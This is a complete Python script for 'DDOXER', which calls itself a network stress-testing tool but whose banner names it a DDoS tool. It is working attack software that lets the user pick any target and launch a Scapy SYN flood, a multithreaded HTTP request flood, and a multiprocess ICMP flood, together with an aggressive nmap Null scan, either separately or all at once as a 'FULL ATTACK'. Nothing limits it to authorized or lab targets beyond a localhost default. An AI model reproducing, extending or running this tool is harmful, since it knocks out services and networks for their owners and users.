#!/usr/bin/env python3
"""
DDOXER - Network Stress Testing Tool
"""

import sys
import os
import random
import string
import threading
import time
import signal
import multiprocessing
import subprocess
import requests
from ping3 import ping
from scapy.all import IP, TCP, Ether, sendpfast

from colorama import Fore, Back, Style, init
init(autoreset=True)

R = lambda t: f"{Fore.RED}{t}{Style.RESET_ALL}"
G = lambda t: f"{Fore.GREEN}{t}{Style.RESET_ALL}"
Y = lambda t: f"{Fore.YELLOW}{t}{Style.RESET_ALL}"
C = lambda t: f"{Fore.CYAN}{t}{Style.RESET_ALL}"
M = lambda t: f"{Fore.MAGENTA}{t}{Style.RESET_ALL}"
B = lambda t: f"{Style.BRIGHT}{t}{Style.RESET_ALL}"
W = lambda t: f"{Fore.WHITE}{t}{Style.RESET_ALL}"

BANNER = C("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗         ║
║   ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗        ║
║   ██║  ██║██   ██╔██║   ██║ ╚███╔╝ █████╗  ██████╔╝        ║
║   ██║  ██║██   ██╗██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗        ║
║   ██████╔╝███████║╚██████╔╝██╔╝ ██╗███████╗██║  ██║        ║
║   ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ║
║                                                              ║
║            DDOS tool Created by (@xtom3)                     ║
║                   Version 2.0                                ║
╚══════════════════════════════════════════════════════════════╝
""")

TARGET_IP = "127.0.0.1"
TARGET_HTTP_HOST = "http://localhost:8000"
TARGET_PORT = 80
SCAPY_PPS = 5000
HTTP_THREADS = 200
HTTP_LOOPS_PER_THREAD = 100
HTTP_TIMEOUT = 5.0
ICMP_PROCESSES = 4
NMAP_TIMEOUT = 60

NO_ROOT_MODE = os.name != 'posix' or os.getuid() != 0

stats_lock = threading.Lock()
successful_requests = 0
failed_requests = 0

running_processes = []
attack_active = False
attack_lock = threading.Lock()

SEP = C("=" * 50)
SEP_S = C("=" * 35)


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_user_input(prompt, default=None, input_type=str, choices=None):
    while True:
        try:
            if default is not None:
                user_input = input(f"{C(prompt)} [{Y(str(default))}]: ").strip()
                if not user_input:
                    return default
            else:
                user_input = input(f"{C(prompt)}: ").strip()
                if not user_input:
                    print(f"{Y('[!] Input cannot be empty!')}")
                    continue

            if choices is not None:
                if user_input not in choices:
                    print(f"{Y('[!] Invalid choice!')} Choose from: {C(', '.join(choices))}")
                    continue

            if input_type == int:
                return int(user_input)
            elif input_type == bool:
                return user_input.lower() in ['yes', 'y', 'true', '1']
            else:
                return user_input
        except ValueError:
            print(f"{Y('[!] Invalid input format!')}")


def setup_configuration():
    global TARGET_IP, TARGET_PORT, TARGET_HTTP_HOST, SCAPY_PPS
    global HTTP_THREADS, HTTP_LOOPS_PER_THREAD, HTTP_TIMEOUT, ICMP_PROCESSES, NMAP_TIMEOUT

    clear_screen()
    print(BANNER)
    print(f"\n{SEP}")
    print(f"{B(C('   DDOXER CONFIGURATION SETUP   '))}")
    print(SEP)
    print(f"\n{Y('[!] Press Enter to use default values')}\n")

    print(f"\n{C('--- TARGET SETTINGS ---')}")
    TARGET_IP = get_user_input("Target IP Address", "127.0.0.1")
    TARGET_PORT = get_user_input("Target Port", 80, int)
    TARGET_HTTP_HOST = get_user_input("HTTP Host URL", f"http://{TARGET_IP}:{TARGET_PORT}")

    print(f"\n{C('--- ATTACK SETTINGS ---')}")
    print(f"{Y('[!] Higher values = More aggressive attack')}")
    SCAPY_PPS = get_user_input("SYN Packets Per Second (PPS)", 5000, int)
    HTTP_THREADS = get_user_input("HTTP Threads (concurrent connections)", 200, int)
    HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int)
    HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float)
    ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int)
    NMAP_TIMEOUT = get_user_input("Nmap Scan Timeout (seconds)", 60, int)

    print(f"\n{SEP}")
    print(f"{B(C('   CONFIGURATION SUMMARY   '))}")
    print(SEP)
    print(f"  Target IP:      {M(TARGET_IP)}")
    print(f"  Target Port:    {M(str(TARGET_PORT))}")
    print(f"  HTTP Host:      {M(TARGET_HTTP_HOST)}")
    print(f"  SYN PPS:        {M(str(SCAPY_PPS))}")
    print(f"  HTTP Threads:   {M(str(HTTP_THREADS))}")
    print(f"  HTTP Req/Thread:{M(str(HTTP_LOOPS_PER_THREAD))}")
    print(f"  HTTP Timeout:   {M(str(HTTP_TIMEOUT))}s")
    print(f"  ICMP Workers:   {M(str(ICMP_PROCESSES))}")
    print(f"  Nmap Timeout:   {M(str(NMAP_TIMEOUT))}s")
    print(SEP)

    confirm = get_user_input("\nApply these settings?", "yes", choices=['yes', 'no'])
    if confirm == 'no':
        print(f"{C('[*] Restarting configuration...')}")
        time.sleep(1)
        setup_configuration()

    print(f"\n{G('[+] Configuration saved successfully!')}")
    time.sleep(1)


def generate_random_text(length=8):
    characters = string.ascii_lowercase + string.digits
    return "".join(random.choice(characters) for _ in range(length))


def run_nmap_scan():
    print(f"\n{C('[*]')} [Nmap Engine] Starting TCP Null scan on {M(TARGET_IP)}...")
    print(f"{G('[+]')} [Nmap] Command: {Y('nmap -T5 -sN ' + TARGET_IP)}")

    try:
        cmd = ["nmap", "-T5", "-sN", TARGET_IP]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=NMAP_TIMEOUT)

        print(f"\n{SEP}")
        print(f"{B(C('   NMAP SCAN RESULTS (TCP Null Scan)   '))}")
        print(SEP)
        print(result.stdout)
        if result.stderr:
            print(f"{Y('[!] Errors/Warnings:')}")
            print(result.stderr)
        print(f"{SEP}\n")
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print(f"{R('[-] Nmap scan timed out after ' + str(NMAP_TIMEOUT) + ' seconds.')}")
        return False
    except FileNotFoundError:
        print(f"{R('[-] Nmap not found!')} Please install nmap:")
        print(f"    {Y('Ubuntu: sudo apt-get install nmap')}")
        print(f"    {Y('Termux: pkg install nmap')}")
        print(f"    {Y('MacOS: brew install nmap')}")
        return False
    except Exception as e:
        print(f"{R('[-] Nmap scan failed: ' + str(e))}")
        return False


def http_worker(thread_id):
    global successful_requests, failed_requests
    session = requests.Session()
    local_success = 0
    local_failed = 0

    for _ in range(HTTP_LOOPS_PER_THREAD):
        random_path = f"/{generate_random_text()}"
        url = f"{TARGET_HTTP_HOST}{random_path}"
        try:
            response = session.get(url, timeout=HTTP_TIMEOUT)
            if response.status_code < 500:
                local_success += 1
            else:
                local_failed += 1
        except requests.RequestException:
            local_failed += 1

    with stats_lock:
        successful_requests += local_success
        failed_requests += local_failed


def run_http_layer7_test():
    global successful_requests, failed_requests
    successful_requests = 0
    failed_requests = 0

    print(f"\n{C('[*]')} [HTTP Engine] Initializing {M(str(HTTP_THREADS))} threads...")
    print(f"{C('[*]')} Target: {M(TARGET_HTTP_HOST)}")
    print(f"{C('[*]')} Each thread will send {M(str(HTTP_LOOPS_PER_THREAD))} requests")

    start_time = time.time()
    threads = []

    for t_id in range(HTTP_THREADS):
        t = threading.Thread(target=http_worker, args=(t_id,))
        threads.append(t)
        t.start()

    def show_progress():
        while any(t.is_alive() for t in threads):
            with stats_lock:
                total = successful_requests + failed_requests
                print(f"\r{C('[*]')} Progress: {M(str(total))} requests sent...", end='', flush=True)
            time.sleep(1)

    progress_thread = threading.Thread(target=show_progress, daemon=True)
    progress_thread.start()

    for t in threads:
        t.join()

    end_time = time.time()
    total_time = end_time - start_time
    total_reqs = successful_requests + failed_requests

    print(f"\n{SEP_S}")
    print(f"{B(C('   HTTP ENGINE REPORT   '))}")
    print(SEP_S)
    print(f"  Time Taken:           {M(f'{total_time:.2f}')} seconds")
    print(f"  Successful Hits:      {G(str(successful_requests))}")
    print(f"  Failed/Dropped:       {R(str(failed_requests))}")
    if total_time > 0:
        print(f"  Throughput Rate:      {M(f'{total_reqs / total_time:.2f}')} req/s")
    print(f"{SEP_S}\n")


def run_scapy_syn_flood():
    if NO_ROOT_MODE:
        print(f"{R('[-] SYN flood requires root privileges!')}")
        return False

    print(f"\n{C('[*]')} [Scapy Engine] Preparing SYN flood...")
    print(f"{C('[*]')} Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    print(f"{C('[*]')} Speed: {M(str(SCAPY_PPS))} packets/second")

    try:
        packet = Ether() / IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S")
        print(f"{G('[+]')} Launching flood... ({Y('Press Ctrl+C to stop')})")
        sendpfast(packet, pps=SCAPY_PPS, loop=0)
        return True
    except Exception as e:
        print(f"{R('[-] Scapy Engine failure: ' + str(e))}")
        return False


def icmp_worker(process_id, target):
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    packet_count = 0
    while True:
        try:
            ping(target, timeout=0.1, size=64)
            packet_count += 1
            if packet_count % 500 == 0:
                print(f"\r[ICMP Worker {M(str(process_id))}] Sent {M(str(packet_count))} packets", end='', flush=True)
        except Exception:
            pass


def run_icmp_flood():
    print(f"\n{C('[*]')} [ICMP Engine] Deploying {M(str(ICMP_PROCESSES))} workers...")
    print(f"{C('[*]')} Target: {M(TARGET_IP)}")

    processes = []
    try:
        for i in range(ICMP_PROCESSES):
            p = multiprocessing.Process(target=icmp_worker, args=(i, TARGET_IP))
            processes.append(p)
            p.start()

        print(f"{G('[+]')} ICMP flood running... ({Y('Press Ctrl+C to stop')})")
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print(f"\n{C('[*]')} Stopping ICMP workers...")
        for p in processes:
            p.terminate()
            p.join()


def run_all_parallel():
    global attack_active
    print(f"\n{SEP}")
    print(f"{B(R('   LAUNCHING FULL ATTACK   '))}")
    print(SEP)
    print(f"  Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    print(f"  Mode:   {Y('HTTP-ONLY' if NO_ROOT_MODE else 'FULL')}")
    print(f"{SEP}\n")

    engines = []
    nmap_process = multiprocessing.Process(target=run_nmap_scan, name="Nmap-Engine")
    engines.append(nmap_process)

    if NO_ROOT_MODE:
        print(f"{Y('[*] No-root mode: HTTP + ICMP attacks')}")
        engines.append(multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine"))
        engines.append(multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine"))
    else:
        engines.extend([
            multiprocessing.Process(target=run_scapy_syn_flood, name="Scapy-Engine"),
            multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine"),
            multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine"),
        ])

    global running_processes
    running_processes = engines
    attack_active = True

    try:
        for engine in engines:
            engine.start()
        for engine in engines:
            engine.join()
    except KeyboardInterrupt:
        print(f"\n{R('[-] Interrupt received.')} Terminating...")
        for engine in engines:
            if engine.is_alive():
                engine.terminate()
                engine.join()
    finally:
        attack_active = False
        running_processes = []
    return True


def stop_attacks():
    global attack_active
    with attack_lock:
        if not attack_active:
            return False
        print(f"\n{C('[*]')} Stopping all attacks...")
        for p in running_processes:
            if p.is_alive():
                p.terminate()
                p.join()
        attack_active = False
        running_processes.clear()
        print(f"{G('[+] All attacks stopped.')}")
    return True


def show_menu():
    clear_screen()
    print(BANNER)
    print(f"\n{SEP}")
    print(f"{B(C('   MAIN MENU   '))}")
    print(SEP)
    print(f"  Target: {M(TARGET_IP + ':' + str(TARGET_PORT))}")
    print(f"  Mode:   {C('HTTP-ONLY' if NO_ROOT_MODE else 'FULL')}")
    status_color = R if attack_active else G
    print(f"  Status: {status_color('RUNNING' if attack_active else 'IDLE')}")
    print(SEP)
    print(f"\n  {Y('[1]')} Start Full Attack (Nmap + SYN + HTTP + ICMP)")
    print(f"  {Y('[2]')} Run Nmap Scan Only (-T5 -sN)")
    print(f"  {Y('[3]')} Start HTTP Flood Only")
    print(f"  {Y('[4]')} Start SYN Flood Only (requires root)")
    print(f"  {Y('[5]')} Start ICMP Flood Only")
    print(f"  {Y('[6]')} Stop All Attacks")
    print(f"  {Y('[7]')} Show Status")
    print(f"  {Y('[8]')} Configure Target")
    print(f"  {Y('[9]')} Advanced Configuration")
    print(f"  {Y('[10]')} Exit")
    print(f"\n{SEP}")


def show_status():
    clear_screen()
    print(BANNER)
    print(f"\n{SEP}")
    print(f"{B(C('   SYSTEM STATUS   '))}")
    print(SEP)
    print(f"  Target IP:       {M(TARGET_IP)}")
    print(f"  Target Port:     {M(str(TARGET_PORT))}")
    print(f"  HTTP Host:       {M(TARGET_HTTP_HOST)}")
    mode_str = 'HTTP-ONLY (no-root)' if NO_ROOT_MODE else 'FULL (SYN+HTTP+ICMP)'
    print(f"  Running Mode:    {Y(mode_str)}")
    print(f"  Attack Active:   {G('YES') if attack_active else R('NO')}")
    print(f"  Root Privileges: {G('YES') if not NO_ROOT_MODE else R('NO')}")
    print(f"\n{C('--- Attack Parameters ---')}")
    print(f"  SYN PPS:         {M(str(SCAPY_PPS))}")
    print(f"  HTTP Threads:    {M(str(HTTP_THREADS))}")
    print(f"  HTTP Req/Thread: {M(str(HTTP_LOOPS_PER_THREAD))}")
    print(f"  HTTP Timeout:    {M(str(HTTP_TIMEOUT))}s")
    print(f"  ICMP Workers:    {M(str(ICMP_PROCESSES))}")
    print(f"  Nmap Timeout:    {M(str(NMAP_TIMEOUT))}s")

    if attack_active:
        print(f"\n{C('--- Live Statistics ---')}")
        with stats_lock:
            total = successful_requests + failed_requests
            print(f"  Total HTTP Requests: {M(str(total))}")
            print(f"  Successful:          {G(str(successful_requests))}")
            print(f"  Failed:              {R(str(failed_requests))}")
            if total > 0:
                rate = (successful_requests / total) * 100
                print(f"  Success Rate:        {M(f'{rate:.2f}%')}")

    print(SEP)
    input(f"\n{C('Press Enter to continue...')}")


def advanced_config():
    global HTTP_TIMEOUT, HTTP_LOOPS_PER_THREAD, SCAPY_PPS, ICMP_PROCESSES, NMAP_TIMEOUT

    clear_screen()
    print(BANNER)
    print(f"\n{SEP}")
    print(f"{B(C('   ADVANCED CONFIGURATION   '))}")
    print(SEP)
    print(f"\n{B(C('Current Values:'))}")
    print(f"  {Y('1.')} SYN PPS:         {M(str(SCAPY_PPS))}")
    print(f"  {Y('2.')} HTTP Threads:    {M(str(HTTP_THREADS))}")
    print(f"  {Y('3.')} HTTP Req/Thread: {M(str(HTTP_LOOPS_PER_THREAD))}")
    print(f"  {Y('4.')} HTTP Timeout:    {M(str(HTTP_TIMEOUT))}s")
    print(f"  {Y('5.')} ICMP Workers:    {M(str(ICMP_PROCESSES))}")
    print(f"  {Y('6.')} Nmap Timeout:    {M(str(NMAP_TIMEOUT))}s")
    print(f"\n  {Y('7.')} Reset to defaults")
    print(f"  {Y('8.')} Back to main menu")

    choice = get_user_input("\nSelect option to modify", choices=['1', '2', '3', '4', '5', '6', '7', '8'])

    if choice == '1':
        SCAPY_PPS = get_user_input("SYN Packets Per Second", 5000, int)
    elif choice == '2':
        HTTP_THREADS = get_user_input("HTTP Threads", 200, int)
    elif choice == '3':
        HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int)
    elif choice == '4':
        HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float)
    elif choice == '5':
        ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int)
    elif choice == '6':
        NMAP_TIMEOUT = get_user_input("Nmap Timeout (seconds)", 60, int)
    elif choice == '7':
        SCAPY_PPS = 5000
        HTTP_THREADS = 200
        HTTP_LOOPS_PER_THREAD = 100
        HTTP_TIMEOUT = 5.0
        ICMP_PROCESSES = 4
        NMAP_TIMEOUT = 60
        print(f"{G('[+] Reset to default values!')}")
        time.sleep(1)
    elif choice == '8':
        return

    print(f"{G('[+] Configuration updated!')}")
    time.sleep(1)


def main():
    clear_screen()
    print(BANNER)
    print(f"\n{SEP}")
    print(f"{B(C('   WELCOME TO DDOXER   '))}")
    print(SEP)
    mode_str = 'HTTP-ONLY' if NO_ROOT_MODE else 'FULL'
    print(f"  Running in:      {Y(mode_str)} mode")
    print(f"  Root privileges: {G('YES') if not NO_ROOT_MODE else R('NO')}")
    print(SEP)

    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
        print(f"{G('[+] Nmap found!')}")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Y('[!] Warning: Nmap not found.')} Install with:")
        print(f"    {Y('Ubuntu: sudo apt-get install nmap')}")
        print(f"    {Y('Termux: pkg install nmap')}")

    if get_user_input("\nConfigure target now?", "yes", choices=['yes', 'no']) == 'yes':
        setup_configuration()

    print(f"\n{C('[*] Starting DDOXER interactive menu...')}")
    time.sleep(1)

    while True:
        try:
            show_menu()
            choice = get_user_input("\nSelect option", choices=['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'])

            if choice == "1":
                if attack_active:
                    print(f"{Y('[-] Attack already running! Stop it first.')}")
                    time.sleep(1)
                    continue
                print(f"\n{C('[*]')} Starting {R('FULL ATTACK')}...")
                print(f"{Y('[!] Press Ctrl+C to stop all attacks')}")
                t = threading.Thread(target=run_all_parallel, daemon=True)
                t.start()
                print(f"{G('[+] Attack launched in background!')}")
                time.sleep(1)

            elif choice == "2":
                if attack_active:
                    print(f"{Y('[-] Attack is running! Stop it first.')}")
                    time.sleep(1)
                    continue
                run_nmap_scan()
                input(f"\n{C('Press Enter to continue...')}")

            elif choice == "3":
                if attack_active:
                    print(f"{Y('[-] Attack is running! Stop it first.')}")
                    time.sleep(1)
                    continue
                print(f"\n{C('[*] Starting HTTP Flood...')}")
                t = threading.Thread(target=run_http_layer7_test, daemon=True)
                t.start()
                t.join()
                input(f"\n{C('Press Enter to continue...')}")

            elif choice == "4":
                if attack_active:
                    print(f"{Y('[-] Attack is running! Stop it first.')}")
                    time.sleep(1)
                    continue
                if NO_ROOT_MODE:
                    print(f"{R('[-] SYN flood requires root privileges!')}")
                    time.sleep(1)
                    continue
                print(f"\n{C('[*] Starting SYN Flood...')}")
                t = threading.Thread(target=run_scapy_syn_flood, daemon=True)
                t.start()
                t.join()
                input(f"\n{C('Press Enter to continue...')}")

            elif choice == "5":
                if attack_active:
                    print(f"{Y('[-] Attack is running! Stop it first.')}")
                    time.sleep(1)
                    continue
                print(f"\n{C('[*] Starting ICMP Flood...')}")
                print(f"{Y('[!] Press Ctrl+C to stop')}")
                t = threading.Thread(target=run_icmp_flood, daemon=True)
                t.start()
                t.join()
                input(f"\n{C('Press Enter to continue...')}")

            elif choice == "6":
                if stop_attacks():
                    print(f"{G('[+] All attacks stopped.')}")
                else:
                    print(f"{C('[*] No attack is running.')}")
                time.sleep(1)

            elif choice == "7":
                show_status()

            elif choice == "8":
                setup_configuration()

            elif choice == "9":
                advanced_config()

            elif choice == "10":
                if attack_active:
                    print(f"{C('[*] Stopping attacks before exit...')}")
                    stop_attacks()
                print(f"\n{G('[*] Thank you for using DDOXER!')}")
                print(f"{C('[*] Exiting...')}")
                time.sleep(1)
                clear_screen()
                sys.exit(0)

        except KeyboardInterrupt:
            print(f"\n\n{C('[*] Interrupt received. Cleaning up...')}")
            if attack_active:
                stop_attacks()
            print(f"{C('[*] Exiting DDOXER...')}")
            time.sleep(1)
            clear_screen()
            sys.exit(0)
        except Exception as e:
            print(f"{R('[-] Error: ' + str(e))}")
            time.sleep(1)
            continue


if __name__ == "__main__":
    main()
